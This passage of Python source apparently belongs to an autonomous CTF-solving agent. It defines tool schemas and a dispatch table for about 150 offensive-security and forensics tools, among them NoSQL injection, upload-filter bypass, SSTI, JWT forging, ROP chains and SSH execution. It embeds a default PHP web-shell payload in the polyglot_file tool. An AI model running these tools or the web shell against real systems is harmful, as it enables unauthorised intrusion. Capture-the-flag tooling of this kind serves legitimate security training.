    {"name":"nosql_inject","description":"NoSQL (MongoDB) injection tester. Ops: probe (test $ne/$gt/$regex operator injection), auth_bypass (attempt MongoDB auth bypass \u2014 $ne/$gt/$exists/$regex), extract_field (extract field value char-by-char using $regex injection), js_inject (test $where JavaScript injection), nosqlmap (shell to NoSQLMap for full automated scan \u2014 git clone github.com/codingo/NoSQLMap). Supports JSON and form-encoded request bodies.","input_schema":{"type":"object","properties":{"target_url":{"type":"string"},"operation":{"type":"string","enum":["probe","auth_bypass","extract_field","js_inject","nosqlmap"]},"param":{"type":"string"},"password_param":{"type":"string"},"method":{"type":"string"},"charset":{"type":"string"},"headers":{"type":"object"},"cookies":{"type":"object"},"field":{"type":"string"},"data_format":{"type":"string","enum":["form","json"]}},"required":["target_url"]}},
    {"name":"file_upload","description":"File upload exploitation \u2014 MIME spoofing, double extension, .htaccess, null byte, polyglot. Ops: probe (try all bypass techniques), mime_spoof (mismatched Content-Type header), double_ext (file.php.jpg), htaccess (upload .htaccess to enable PHP execution), null_byte (filename%00.jpg injection), fuxploider (shell to fuxploider \u2014 pip install fuxploider). No payload logic \u2014 just the upload mechanism.","input_schema":{"type":"object","properties":{"target_url":{"type":"string"},"operation":{"type":"string","enum":["probe","mime_spoof","double_ext","htaccess","null_byte","fuxploider"]},"upload_param":{"type":"string"},"code_content":{"type":"string","description":"File content to upload (e.g. PHP shell code)"},"filename":{"type":"string"},"output_dir":{"type":"string"},"headers":{"type":"object"},"cookies":{"type":"object"}},"required":["target_url"]}},
    {"name":"template_inject","description":"SSTI blind probe + filter bypass extending ssti_rce. Ops: probe (comprehensive SSTI detection \u2014 delegates to ssti_rce detect), blind_probe (boolean-based blind SSTI), tplmap (shell to tplmap \u2014 git clone github.com/epinna/tplmap), filter_bypass (Jinja2 payloads that avoid underscore/dot/bracket filters using |attr(), lipsum, cycler, joiner, namespace globals), polyglot (single probe that triggers Jinja2/Twig/Freemarker simultaneously).","input_schema":{"type":"object","properties":{"target_url":{"type":"string"},"operation":{"type":"string","enum":["probe","blind_probe","tplmap","filter_bypass","polyglot"]},"param":{"type":"string"},"method":{"type":"string"},"engine":{"type":"string"},"headers":{"type":"object"},"cookies":{"type":"object"}},"required":["target_url","operation"]}},
    {"name":"steg_brute","description":"Steganography password brute-force wrapping stegseek (fastest \u2014 apt install stegseek) + stegcracker (pip install stegcracker). Ops: auto (stegseek \u2192 empty password \u2192 stegcracker in order), stegseek (RickdeJager/stegseek \u2014 fastest steghide cracker, uses rockyou in seconds), stegcracker (slower, more formats), steghide_empty (quick empty password test), outguess_crack (wordlist crack for outguess), all_tools (run every tool in sequence).","input_schema":{"type":"object","properties":{"image_path":{"type":"string"},"operation":{"type":"string","enum":["auto","stegseek","stegcracker","steghide_empty","outguess_crack","all_tools"]},"wordlist":{"type":"string"},"output_dir":{"type":"string"}},"required":["image_path"]}},
    {"name":"pcap_reassemble","description":"PCAP file reconstruction wrapping tshark --export-objects + tcpflow + foremost/binwalk. Ops: auto (export all objects from all protocols + flag scan), http_objects (tshark export HTTP transferred files), ftp_objects (tshark export FTP-DATA files), tcp_stream (reconstruct single TCP stream by ID), all_streams (tcpflow \u2014 every stream to separate file), find_files (run binwalk+foremost on reconstructed data to find embedded files). Essential for 'file-in-pcap' forensics challenges.","input_schema":{"type":"object","properties":{"pcap_path":{"type":"string"},"operation":{"type":"string","enum":["auto","http_objects","ftp_objects","tcp_stream","all_streams","find_files"]},"output_dir":{"type":"string"},"stream_id":{"type":"integer"},"filter_expr":{"type":"string"},"keyword":{"type":"string"}},"required":["pcap_path"]}},
    {"name":"pdf_forensics","description":"PDF forensics wrapping peepdf (pip install peepdf) + pikepdf + pdf-parser.py. Ops: analyze (full scan \u2014 JS, embedded files, streams, metadata), extract_js (extract JavaScript from PDF actions), extract_embedded (extract /EmbeddedFiles and attachments), decompress_streams (decompress all FlateDecode/LZWDecode streams to separate files, flag-scan each), metadata (dump all XMP/DocInfo metadata via exiftool + pdfinfo), find_hidden (search raw bytes for flag patterns + whitespace encoding + optional content layers).","input_schema":{"type":"object","properties":{"pdf_path":{"type":"string"},"operation":{"type":"string","enum":["analyze","extract_js","extract_embedded","decompress_streams","metadata","find_hidden"]},"output_dir":{"type":"string"}},"required":["pdf_path"]}},
    {"name":"image_repair","description":"Corrupted image repair using pngcheck + PIL/struct header patching \u2014 zero external deps beyond PIL. Ops: detect (identify corruption \u2014 wrong magic bytes, zero dimensions, bad CRC, truncated data), fix_png_header (repair PNG magic + recompute IHDR CRC), fix_jpeg_markers (repair SOI/EOI markers, scan for valid JPEG structure), restore_dimensions (patch width/height in PNG IHDR \u2014 common CTF trick where dimensions are set to 0), fix_bmp_header (repair BMP DIB header), check_crc (recompute all PNG chunk CRCs and report mismatches).","input_schema":{"type":"object","properties":{"image_path":{"type":"string"},"operation":{"type":"string","enum":["detect","fix_png_header","fix_jpeg_markers","restore_dimensions","fix_bmp_header","check_crc"]},"width":{"type":"integer","description":"Correct width for restore_dimensions"},"height":{"type":"integer","description":"Correct height for restore_dimensions"},"output_path":{"type":"string"}},"required":["image_path"]}},
    {"name":"compression","description":"Multi-format decompression using 7z + unar + Python stdlib (gzip/bz2/lzma/zipfile/tarfile). Ops: detect (identify compression from magic bytes), decompress (extract with best available tool \u2014 7z first, then unar, then Python stdlib), nested_extract (recursive decompression up to max_depth \u2014 handles 'file-in-file' chains common in General Skills), try_all (attempt every format until one succeeds), list_contents (list archive contents without extracting). Supports: gzip/bzip2/xz/zip/tar/rar/7z/lzma/zstd/lz4.","input_schema":{"type":"object","properties":{"file_path":{"type":"string"},"operation":{"type":"string","enum":["detect","decompress","nested_extract","try_all","list_contents"]},"output_dir":{"type":"string"},"max_depth":{"type":"integer"},"data_hex":{"type":"string"}},"required":[]}},
    {"name":"number_bases","description":"Extended base encoding/decoding wrapping basecrack (pip install basecrack \u2014 auto-detects base16/32/36/58/62/64/85/91/92) + pure Python implementations. Ops: auto (basecrack auto-detect), base85 (ASCII85/btoa a85+b85), base91 (base91 pure Python), base36, custom_b64 (base64 with non-standard alphabet), baudot (Baudot/ITA2 telegraph code), gray_code (Gray/reflected binary code), dna (ACGT DNA encoding 4 mappings), bcd (Binary-Coded Decimal). Decode or encode with direction=encode.","input_schema":{"type":"object","properties":{"text":{"type":"string"},"operation":{"type":"string","enum":["auto","base85","base91","base36","custom_b64","baudot","gray_code","dna","bcd"]},"alphabet":{"type":"string","description":"Custom 64-char alphabet for custom_b64"},"direction":{"type":"string","enum":["decode","encode"]}},"required":["text","operation"]}},
    {"name":"flag_extractor","description":"Scan any text or file for flag patterns, encoded flags, credentials, and interesting data. Ops: scan (find all flag patterns + try base64/hex/rot13/URL-decode each chunk for hidden flags), find_encoded (exhaustive encoding scan), find_credentials (extract username:password, API keys, Bearer tokens, secrets), interesting (URLs, IPs, emails, hex hashes). Works on output from any tool \u2014 pipe large strings through this to find the flag.","input_schema":{"type":"object","properties":{"text":{"type":"string"},"file_path":{"type":"string"},"ctf_name":{"type":"string","description":"CTF flag prefix e.g. picoCTF"},"operation":{"type":"string","enum":["scan","find_encoded","find_credentials","interesting","strings_flag"]},"patterns":{"type":"array","items":{"type":"string"}}},"required":[]}},
]

TOOL_MAP = {
    "execute_shell":       lambda a: tool_execute_shell(a["command"],a.get("timeout",60),a.get("working_dir")),
    "execute_python":      lambda a: tool_execute_python(a["code"],a.get("timeout",60)),
    "decode_transform":    lambda a: tool_decode_transform(a["text"],a["method"],a.get("key"),a.get("key2")),
    "crypto_attack":       lambda a: tool_crypto_attack(a["attack"],**{k:v for k,v in a.items() if k!="attack"}),
    "http_request":        lambda a: tool_http_request(a["url"],a.get("method","GET"),a.get("headers"),a.get("data"),a.get("json_data"),a.get("cookies"),a.get("follow_redirects",True),a.get("verify_ssl",False),a.get("timeout",20)),
    "concurrent_requests": lambda a: tool_concurrent_requests(a["requests_list"],a.get("workers",50),a.get("timeout",5)),
    "tcp_connect":         lambda a: tool_tcp_connect(a["host"],a["port"],a.get("data"),a.get("data_hex"),a.get("timeout",10),a.get("read_until"),a.get("interactive_script")),
    "analyze_file":        lambda a: tool_analyze_file(a["path"],a["operation"]),
    "binary_analysis":     lambda a: tool_binary_analysis(a["path"],a["operation"],a.get("args")),
    "web_attack":          lambda a: tool_web_attack(a["attack"],a["target_url"],**{k:v for k,v in a.items() if k not in ("attack","target_url")}),
    "z3_solve":            lambda a: tool_z3_solve(a["constraints_code"]),
    "sage_math":           lambda a: tool_sage_math(a["code"]),
    "statistical_analysis":lambda a: tool_statistical_analysis(a["operation"],a["data"],**a.get("params",{})),
    "create_workspace":    lambda a: tool_create_workspace(a["base_dir"],a["ctf_name"],a["category"],a["challenge_name"]),
    "write_file":          lambda a: tool_write_file(a["path"],a["content"],a.get("mode","w")),
    "write_binary":        lambda a: tool_write_binary(a["path"],a["hex_content"]),
    "download_file":       lambda a: tool_download_file(a["url"],a["dest_path"],a.get("headers"),a.get("cookies")),
    "submit_flag":         lambda a: tool_submit_flag(a["flag"],a.get("challenge_id","")),
    "detect_flag_format":  lambda a: tool_detect_flag_format(a.get("ctf_name",""),a.get("description",""),a.get("platform_type",""),a.get("hint","")),
    "js_analyze":          lambda a: tool_js_analyze(a["url_or_path"],a["operation"]),
    "wasm_analyze":        lambda a: tool_wasm_analyze(a["path"],a["operation"]),
    "rng_crack":           lambda a: tool_rng_crack(a["operation"],a.get("outputs",[]),a.get("bits",32),a.get("modulus"),a.get("multiplier"),a.get("increment")),
    "mime_email":          lambda a: tool_mime_email(a["operation"],**{k:v for k,v in a.items() if k!="operation"}),
    "source_audit":        lambda a: tool_source_audit(a["path_or_content"],a["operation"],a.get("language")),
    "encoding_bypass":     lambda a: tool_encoding_bypass(a["text"],a["target_bypass"]),
    "docker_recon":        lambda a: tool_docker_recon(a["path"]),
    "custom_cpu_emulate":  lambda a: tool_custom_cpu_emulate(a["code"],a["operation"],timeout=a.get("timeout",120)),
    # ── Elite Intelligence Layer ─────────────────────────────────────────────
    "knowledge_store":     lambda a: tool_knowledge_store(a["ctf_name"],a["key"],a["value"]),
    "knowledge_get":       lambda a: tool_knowledge_get(a["ctf_name"]),
    "browser_agent":       lambda a: tool_browser_agent(a["url"],a["script"],a.get("timeout",60),a.get("capture_requests",False),a.get("capture_screenshot",False)),
    "ghidra_decompile":    lambda a: tool_ghidra_decompile(a["binary_path"],a.get("function_name","main"),a.get("all_functions",False),a.get("project_dir","/tmp/ghidra_proj")),
    "ai_rename_functions": lambda a: tool_ai_rename_functions(a["decompiled_output"],os.environ.get("ANTHROPIC_API_KEY",""),a.get("binary_path","")),
    "libc_lookup":         lambda a: tool_libc_lookup(a["leak_address"],a.get("symbol","puts"),a.get("extra_symbols")),
    "factordb":            lambda a: tool_factordb(a["n"]),
    "angr_solve":          lambda a: tool_angr_solve(a["binary_path"],a.get("find_addr",""),a.get("avoid_addrs"),a.get("stdin_len",64),a.get("custom_code",""),a.get("timeout",120)),
    "sqlmap":              lambda a: tool_sqlmap(a["target_url"],a.get("param",""),a.get("data",""),a.get("cookie",""),a.get("level",3),a.get("risk",2),a.get("technique","BEUSTQ"),a.get("dbms",""),a.get("extra_args","")),
    "ffuf":                lambda a: tool_ffuf(a["url"],a.get("wordlist","/usr/share/wordlists/dirb/common.txt"),a.get("extensions",""),a.get("method","GET"),a.get("headers"),a.get("filter_codes","404,400"),a.get("match_codes",""),a.get("data",""),a.get("fuzz_param","FUZZ"),a.get("timeout",60)),
    "web_crawl":           lambda a: tool_web_crawl(a["base_url"],a.get("max_depth",3),a.get("max_pages",100),a.get("headers"),a.get("cookies"),a.get("find_patterns")),
    "volatility":          lambda a: tool_volatility(a["image_path"],a["plugin"],a.get("args",""),a.get("timeout",120)),
    "frida_trace":         lambda a: tool_frida_trace(a.get("binary_path",""),a.get("script",""),a.get("function_hooks"),a.get("pid",0),a.get("timeout",30)),
    "rank_hypotheses":     lambda a: tool_rank_hypotheses(a["challenge_description"],a["category"],a["recon_results"],os.environ.get("ANTHROPIC_API_KEY","")),
    "pre_solve_recon":     lambda a: tool_pre_solve_recon(a.get("binary_path",""),a.get("url",""),a.get("category","Unknown")),
    "dlog":               lambda a: tool_dlog(a.get("operation","auto"),**{k:v for k,v in a.items() if k!="operation"}),
    "unicorn_emulate":    lambda a: tool_unicorn_emulate(a.get("arch","x86_64"),a.get("shellcode_hex",""),a.get("code_addr",0x1000),a.get("code",""),a.get("registers"),a.get("timeout",60)),
    "writeup_rag":        lambda a: tool_writeup_rag(a["description"],a["category"],a.get("ctf_name",""),a.get("db_path","~/.ctf-solver/writeups.db"),a.get("n_results",5)),
    "index_writeups":     lambda a: tool_index_writeups(a["writeups_dir"],a.get("db_path","~/.ctf-solver/writeups.db")),
    # ── APT Expansion ───────────────────────────────────────────────────────
    "heap_analysis":      lambda a: tool_heap_analysis(a["binary_path"],a["operation"],a.get("args","")),
    "kernel_info":        lambda a: tool_kernel_info(a["operation"],a.get("module_path",""),a.get("args","")),
    "seccomp_analyze":    lambda a: tool_seccomp_analyze(a["binary_path"],a.get("operation","dump")),
    "ret2dlresolve":      lambda a: tool_ret2dlresolve(a["binary_path"],a.get("target_func","system"),a.get("arg","/bin/sh")),
    "srop":               lambda a: tool_srop(a["binary_path"],a.get("operation","frame"),**{k:v for k,v in a.items() if k not in("binary_path","operation")}),
    "afl_fuzz":           lambda a: tool_afl_fuzz(a["binary_path"],a.get("input_dir","/tmp/afl_in"),a.get("output_dir","/tmp/afl_out"),a.get("timeout_ms",100),a.get("run_seconds",60),a.get("extra_args","")),
    "patchelf":           lambda a: tool_patchelf(a["binary_path"],a.get("libc_path",""),a.get("ld_path",""),a.get("operation","patch")),
    "coppersmith":        lambda a: tool_coppersmith(a["operation"],**{k:v for k,v in a.items() if k!="operation"}),
    "ecdsa_lattice":      lambda a: tool_ecdsa_lattice(a.get("operation","hnp"),**{k:v for k,v in a.items() if k!="operation"}),
    "lll":                lambda a: tool_lll(a["matrix_rows"],a.get("operation","lll"),**{k:v for k,v in a.items() if k not in("matrix_rows","operation")}),
    "aes_gcm_attack":     lambda a: tool_aes_gcm_attack(a["operation"],**{k:v for k,v in a.items() if k!="operation"}),
    "bleichenbacher":     lambda a: tool_bleichenbacher(a["host"],a.get("port",443),a.get("operation","probe"),**{k:v for k,v in a.items() if k not in("host","port","operation")}),
    "http_smuggle":       lambda a: tool_http_smuggle(a["target_url"],a.get("operation","detect"),**{k:v for k,v in a.items() if k not in("target_url","operation")}),
    "graphql":            lambda a: tool_graphql(a["target_url"],a.get("operation","introspect"),a.get("query",""),a.get("headers"),a.get("cookies")),
    "websocket_fuzz":     lambda a: tool_websocket_fuzz(a["url"],a.get("operation","connect"),a.get("messages"),a.get("script",""),a.get("timeout",20)),
    "oauth_attack":       lambda a: tool_oauth_attack(a["target_url"],a.get("operation","probe"),a.get("client_id",""),a.get("redirect_uri","")),
    "cache_poison":       lambda a: tool_cache_poison(a["target_url"],a.get("operation","probe"),**{k:v for k,v in a.items() if k not in("target_url","operation")}),
    "shodan":             lambda a: tool_shodan(a["query"],a.get("operation","search"),a.get("api_key","")),
    "tls_decrypt":        lambda a: tool_tls_decrypt(a["pcap_path"],a.get("keylog_path",""),a.get("privkey_path",""),a.get("operation","decrypt"),a.get("filter_str","http")),
    "deobfuscate":        lambda a: tool_deobfuscate(a["binary_path"],a.get("operation","detect"),**{k:v for k,v in a.items() if k not in("binary_path","operation")}),
    "bytecode_disasm":    lambda a: tool_bytecode_disasm(a["input_path"],a.get("language","auto"),a.get("operation","disasm")),
    "audio_steg":         lambda a: tool_audio_steg(a["audio_path"],a.get("operation","analyze")),
    "git_forensics":      lambda a: tool_git_forensics(a["repo_path"],a.get("operation","all")),
    "triton_taint":       lambda a: tool_triton_taint(a["binary_path"],a.get("stdin_input",""),a.get("operation","trace")),
    "aeg_pipeline":       lambda a: tool_aeg_pipeline(a["binary_path"],a.get("operation","run"),a.get("fuzz_seconds",30),a.get("output_dir","/tmp/afl_out")),
    "docker_sandbox":     lambda a: tool_docker_sandbox(a["operation"],a.get("binary_path",""),a.get("exploit_code",""),a.get("libc_path",""),a.get("timeout",30)),
    "bindiff":            lambda a: tool_bindiff(a["binary_a"],a["binary_b"],a.get("operation","diff")),
    "encrypted_store":    lambda a: tool_encrypted_store(a["operation"],a.get("key",""),a.get("value",""),a.get("store_path","~/.ctf-solver/keystore.json")),
    "differential_cryptanalysis": lambda a: tool_differential_cryptanalysis(a["operation"],**{k:v for k,v in a.items() if k!="operation"}),

    # ── 53 gap-closing tools ──────────────────────────────────────────────────
    "2fa_bypass":           lambda a: tool_2fa_bypass(a.get("operation","probe"),a.get("target_url",""),a.get("param",""),a.get("method","POST"),a.get("headers"),a.get("cookies"),a.get("secret",""),a.get("token_length",6)),
    "android_vuln":         lambda a: tool_android_vuln(a.get("operation","scan"),a.get("target",""),a.get("package_name",""),a.get("device","usb"),a.get("extra","")),
    "apk_analyze":          lambda a: tool_apk_analyze(a["apk_path"],a.get("operation","all"),a.get("class_filter",""),a.get("output_dir","")),
    "apk_resign":           lambda a: tool_apk_resign(a["apk_path"],a.get("operation","full_pipeline"),a.get("patch_smali",""),a.get("target_class",""),a.get("output_path","")),
    "arm_rop":              lambda a: tool_arm_rop(a["binary_path"],a.get("operation","chain"),a.get("libc_path",""),a.get("arch","arm64"),a.get("goal","shell"),a.get("base_addr","0")),
    "asm_eval":             lambda a: tool_asm_eval(a["code_or_path"],a.get("operation","eval"),a.get("arch","x86_64"),a.get("entry","_start"),a.get("inputs",{}),a.get("steps",100)),
    "binary_patch":         lambda a: tool_binary_patch(a["binary_path"],a.get("operation","nop"),a.get("offset","0"),a.get("size",1),a.get("new_bytes",""),a.get("output_path",""),a.get("function_name",""),a.get("condition","")),
    "challenge_classifier":   lambda a: tool_challenge_classifier(a.get("description",""),a.get("files",[]),a.get("category_hint",""),a.get("use_api",False)),
    "cloud_forensics":      lambda a: tool_cloud_forensics(a["path"],a.get("operation","analyze"),a.get("cloud","auto"),a.get("keyword","")),
    "cors_exploit":         lambda a: tool_cors_exploit(a["target_url"],a.get("operation","probe"),a.get("origin",""),a.get("credentials",True),a.get("headers"),a.get("cookies")),
    "cpp_vtable":           lambda a: tool_cpp_vtable(a.get("binary_path",""),a.get("operation","detect"),a.get("target_class",""),a.get("rip_target","")),
    "disk_forensics":       lambda a: tool_disk_forensics(a["image_path"],a.get("operation","analyze"),a.get("partition",0),a.get("output_dir",""),a.get("keyword","")),
    "dom_xss":              lambda a: tool_dom_xss(a.get("operation","analyze"),a.get("url_or_path",""),a.get("html_content",""),a.get("sink",""),a.get("extra_payloads","")),
    "dotnet_decompile":     lambda a: tool_dotnet_decompile(a["binary_path"],a.get("operation","decompile"),a.get("type_name",""),a.get("method_name",""),a.get("output_path","")),
    "ebpf_exploit":         lambda a: tool_ebpf_exploit(a.get("operation","detect"),a.get("program_path",""),a.get("vuln_type","")),
    "ecc_special_attacks":    lambda a: tool_ecc_special_attacks(a.get("operation","detect"),**{k:v for k,v in a.items() if k!="operation"}),
    "ethereum_exploit":     lambda a: tool_ethereum_exploit(a.get("operation","analyze"),a.get("contract_source",""),a.get("contract_address",""),a.get("network","local"),a.get("target_function",""),a.get("value_eth","0")),
    "firmware_unpack":      lambda a: tool_firmware_unpack(a["firmware_path"],a.get("operation","analyze"),a.get("arch","auto"),a.get("output_dir","")),
    "flutter_re":           lambda a: tool_flutter_re(a.get("apk_path",""),a.get("binary_path",""),a.get("operation","detect")),
    "fsop":                 lambda a: tool_fsop(a.get("binary_path",""),a.get("operation","detect"),a.get("libc_path",""),a.get("target_func","system"),a.get("rip_control","0")),
    "gdb_remote":           lambda a: tool_gdb_remote(a["host"],a.get("port",1234),a.get("binary_path",""),a.get("operation","connect"),a.get("script",""),a.get("find_addr",""),a.get("avoid_addrs",[]),a.get("timeout",30)),
    "go_rev":               lambda a: tool_go_rev(a["binary_path"],a.get("operation","analyze"),a.get("output_dir","")),
    "hash_crack":           lambda a: tool_hash_crack(a["hash_value"],a.get("operation","auto"),a.get("wordlist","rockyou"),a.get("hash_type","")),
    "house_of_exploit":     lambda a: tool_house_of_exploit(a.get("binary_path",""),a.get("technique","detect"),a.get("libc_path",""),a.get("libc_version",""),a.get("target_addr","0"),a.get("cmd","/bin/sh")),
    "image_steg_advanced":  lambda a: tool_image_steg_advanced(a.get("image_path",""),a.get("operation","auto"),a.get("channel","all"),a.get("bit_plane",0),a.get("output_path","")),
    "ios_vuln":             lambda a: tool_ios_vuln(a.get("operation","scan"),a.get("target",""),a.get("bundle_id",""),a.get("device","usb")),
    "ipa_analyze":          lambda a: tool_ipa_analyze(a["ipa_path"],a.get("operation","all"),a.get("output_dir",""),a.get("class_filter","")),
    "java_sandbox":         lambda a: tool_java_sandbox(a.get("source_code",""),a.get("source_path",""),a.get("operation","run"),a.get("class_name","Main"),a.get("stdin_input",""),a.get("timeout",30)),
    "kernel_lpe":           lambda a: tool_kernel_lpe(a.get("operation","detect"),a.get("module_path",""),a.get("vuln_type",""),a.get("target_cred","commit_creds")),
    "node_exec":            lambda a: tool_node_exec(a.get("code",""),a.get("file_path",""),a.get("operation","run"),a.get("pattern","picoCTF{"),a.get("timeout",30)),
    "pcap_deep":            lambda a: tool_pcap_deep(a["pcap_path"],a.get("operation","summary"),a.get("key_path",""),a.get("output_dir",""),a.get("filter_expr",""),a.get("keyword","")),
    "pe_analysis":          lambda a: tool_pe_analysis(a["binary_path"],a.get("operation","info"),a.get("resource_type",""),a.get("output_dir","")),
    "polyglot_file":          lambda a: tool_polyglot_file(a.get("operation","list"),a.get("file_type_a","gif"),a.get("file_type_b","php"),a.get("content","<?php system($_GET['cmd']); ?>"),a.get("input_path",""),a.get("output_path","")),
    "powershell_deobf":     lambda a: tool_powershell_deobf(a.get("script_path",""),a.get("script_content",""),a.get("operation","deobfuscate")),
    "pqc_attack":           lambda a: tool_pqc_attack(a.get("operation","detect"),**{k:v for k,v in a.items() if k!="operation"}),
    "pyjail_escape":        lambda a: tool_pyjail_escape(a.get("operation","detect"),a.get("jail_code",""),a.get("available",""),a.get("blocked","")),
    "qr_decode":            lambda a: tool_qr_decode(a.get("image_path",""),a.get("operation","decode"),a.get("barcode_type","any"),a.get("data","")),
    "rop_chain":              lambda a: tool_rop_chain(a["binary_path"],a.get("operation","build"),a.get("goal","shell"),a.get("extra_gadgets",""),a.get("libc_path",""),a.get("base_addr","0")),
    "rust_sandbox":         lambda a: tool_rust_sandbox(a.get("source_code",""),a.get("source_path",""),a.get("operation","run"),a.get("patch",""),a.get("timeout",30)),
    "sdr_analyze":          lambda a: tool_sdr_analyze(a.get("file_path",""),a.get("operation","analyze"),a.get("frequency",0),a.get("sample_rate",0),a.get("modulation","auto")),
    "solve_resume":           lambda a: tool_solve_resume(a.get("operation","save"),a.get("session_id",""),a.get("state_path","~/.ctf-solver/sessions"),a.get("conversation"),a.get("metadata")),
    "ssh_exec":             lambda a: tool_ssh_exec(a["host"],a.get("port",22),a.get("username",""),a.get("password",""),a.get("key_path",""),a.get("operation","run_command"),a.get("command",""),a.get("remote_path",""),a.get("local_path",""),a.get("script","")),
    "ssl_pinning_bypass":   lambda a: tool_ssl_pinning_bypass(a.get("operation","frida"),a.get("target",""),a.get("package_name",""),a.get("method","auto")),
    "ssrf_chain":           lambda a: tool_ssrf_chain(a["target_url"],a.get("operation","probe"),a.get("param","url"),a.get("method","GET"),a.get("headers"),a.get("cookies"),a.get("internal_target",""),a.get("custom_payload","")),
    "ssti_rce":               lambda a: tool_ssti_rce(a.get("operation","detect"),a.get("engine","auto"),a.get("target_url",""),a.get("param",""),a.get("method","GET"),a.get("headers"),a.get("cookies"),a.get("custom_payload","")),
    "swagger_fuzz":         lambda a: tool_swagger_fuzz(a["target_url"],a.get("operation","discover"),a.get("endpoint",""),a.get("method","GET"),a.get("output_path",""),a.get("headers"),a.get("cookies")),
    "swift_decompile":      lambda a: tool_swift_decompile(a.get("binary_path",""),a.get("ipa_path",""),a.get("operation","analyze")),
    "vm_devirt":            lambda a: tool_vm_devirt(a["binary_path"],a.get("operation","detect"),a.get("handler_addr",""),a.get("opcode_map",{})),
    "windows_forensics":    lambda a: tool_windows_forensics(a["path"],a.get("operation","all"),a.get("output_dir",""),a.get("keyword","")),
    "xs_leak":              lambda a: tool_xs_leak(a["target_url"],a.get("operation","css_oracle"),a.get("secret_endpoint",""),a.get("secret_attr","secret"),a.get("charset","0123456789abcdef"),a.get("secret_len",32),a.get("upload_endpoint",""),a.get("visit_endpoint",""),a.get("output",{})),
    "zkp_attack":           lambda a: tool_zkp_attack(a.get("operation","detect"),**{k:v for k,v in a.items() if k!="operation"}),

    # ── previously missing dispatch entries ─────────────────────────────────
    "statistical_analysis":lambda a: tool_statistical_analysis(a["operation"],a["data"],**a.get("params",{})),
    "format_string_exploit":lambda a: tool_format_string_exploit(a.get("binary_path",""),a.get("host",""),a.get("port",0),a.get("operation","find_offset"),a.get("write_addr",""),a.get("write_val",""),a.get("offset",0)),
    "deserialization_exploit":lambda a: tool_deserialization_exploit(a["language"],a.get("operation","list"),a.get("gadget_chain",""),a.get("command","id"),a.get("output_format","base64"),a.get("extra_args","")),

        "deserialization_exploit":lambda a: tool_deserialization_exploit(a["language"],a.get("operation","list"),a.get("gadget_chain",""),a.get("command","id"),a.get("output_format","base64"),a.get("extra_args","")),

    # ── 23 new tools ───────────────────────────────────────────────────────────
    "rsa_toolkit":  lambda a: tool_rsa_toolkit(a.get("operation","auto"),a.get("n",""),a.get("e","65537"),a.get("c",""),a.get("p",""),a.get("q",""),a.get("factors"),a.get("moduli"),a.get("output_file","")),
    "cbc_oracle":  lambda a: tool_cbc_oracle(a.get("operation","decrypt"),a.get("target_url",""),a.get("ciphertext_hex",""),a.get("block_size",16),a.get("oracle_param","cipher"),a.get("method","POST"),a.get("encoding","hex"),a.get("headers"),a.get("cookies"),a.get("known_plaintext","")),
    "vigenere_crack":  lambda a: tool_vigenere_crack(a["ciphertext"],a.get("operation","crack"),a.get("key_length",0),a.get("known_key","")),
    "side_channel":  lambda a: tool_side_channel(a.get("operation","timing_attack"),a.get("target_url",""),a.get("param","password"),a.get("charset","abcdefghijklmnopqrstuvwxyz0123456789"),a.get("known_prefix",""),a.get("secret_len",32),a.get("method","POST"),a.get("samples",5),a.get("headers"),a.get("cookies"),a.get("measurements")),
    "one_gadget":  lambda a: tool_one_gadget(a.get("libc_path",""),a.get("operation","find"),a.get("leak_addr",""),a.get("leak_symbol","puts"),a.get("constraints")),
    "pwn_template":  lambda a: tool_pwn_template(a.get("binary_path",""),a.get("host",""),a.get("port",0),a.get("operation","generate"),a.get("vuln_type","auto"),a.get("libc_path","")),
    "heap_visualize":  lambda a: tool_heap_visualize(a.get("operation","parse_state"),a.get("gdb_output",""),a.get("binary_path",""),a.get("pid",0)),
    "libc_database":  lambda a: tool_libc_database(a.get("operation","search"),a.get("leak_addr",""),a.get("symbol","puts"),a.get("extra_symbols"),a.get("build_id",""),a.get("arch","amd64")),
    "string_decryptor":  lambda a: tool_string_decryptor(a.get("binary_path",""),a.get("operation","floss"),a.get("key",""),a.get("algorithm","auto"),a.get("decompiled_code","")),
    "license_check":  lambda a: tool_license_check(a.get("binary_path",""),a.get("operation","hook_comparisons"),a.get("username","user"),a.get("input_value",""),a.get("timeout",30)),
    "proto_decode":  lambda a: tool_proto_decode(a.get("operation","decode"),a.get("data",""),a.get("binary_path",""),a.get("output_format","json")),
    "jwt_forge":  lambda a: tool_jwt_forge(a.get("token",""),a.get("operation","analyze"),a.get("pubkey_path",""),a.get("secret",""),a.get("attacker_url",""),a.get("kid","/dev/null"),a.get("payload_overrides"),a.get("wordlist","/usr/share/wordlists/rockyou.txt")),
    "nosql_inject":  lambda a: tool_nosql_inject(a["target_url"],a.get("operation","probe"),a.get("param","username"),a.get("password_param","password"),a.get("method","POST"),a.get("charset","0123456789abcdefghijklmnopqrstuvwxyz"),a.get("headers"),a.get("cookies"),a.get("field","username"),a.get("data_format","form")),
    "file_upload":  lambda a: tool_file_upload(a["target_url"],a.get("operation","probe"),a.get("upload_param","file"),a.get("code_param",""),a.get("code_content",""),a.get("filename","test.php"),a.get("output_dir","/tmp/upload_test"),a.get("headers"),a.get("cookies")),
    "template_inject":  lambda a: tool_template_inject(a.get("target_url",""),a.get("operation","probe"),a.get("param","input"),a.get("method","GET"),a.get("engine","auto"),a.get("headers"),a.get("cookies"),a.get("data","")),
    "steg_brute":  lambda a: tool_steg_brute(a["image_path"],a.get("operation","auto"),a.get("wordlist","/usr/share/wordlists/rockyou.txt"),a.get("output_dir","/tmp/steg_extracted")),
    "pcap_reassemble":  lambda a: tool_pcap_reassemble(a["pcap_path"],a.get("operation","auto"),a.get("output_dir",""),a.get("stream_id",0),a.get("filter_expr",""),a.get("keyword","")),
    "pdf_forensics":  lambda a: tool_pdf_forensics(a["pdf_path"],a.get("operation","analyze"),a.get("output_dir","")),
    "image_repair":  lambda a: tool_image_repair(a["image_path"],a.get("operation","detect"),a.get("width",0),a.get("height",0),a.get("output_path","")),
    "compression":  lambda a: tool_compression(a.get("file_path",""),a.get("operation","detect"),a.get("output_dir",""),a.get("max_depth",10),a.get("data_hex","")),
    "number_bases":  lambda a: tool_number_bases(a["text"],a.get("operation","auto"),a.get("alphabet",""),a.get("direction","decode")),
    "flag_extractor":  lambda a: tool_flag_extractor(a.get("text",""),a.get("file_path",""),a.get("ctf_name","picoCTF"),a.get("operation","scan"),a.get("patterns")),
}

# ─── CTF-scoped knowledge graph ───────────────────────────────────────────────
_ctf_knowledge: dict = defaultdict(dict)  # ctf_name → {key: value}
_solve_start_time: float = 0.0
_current_model_display: str = ""
_critic_threshold: int = 6  # trigger critic after this many fruitless iterations

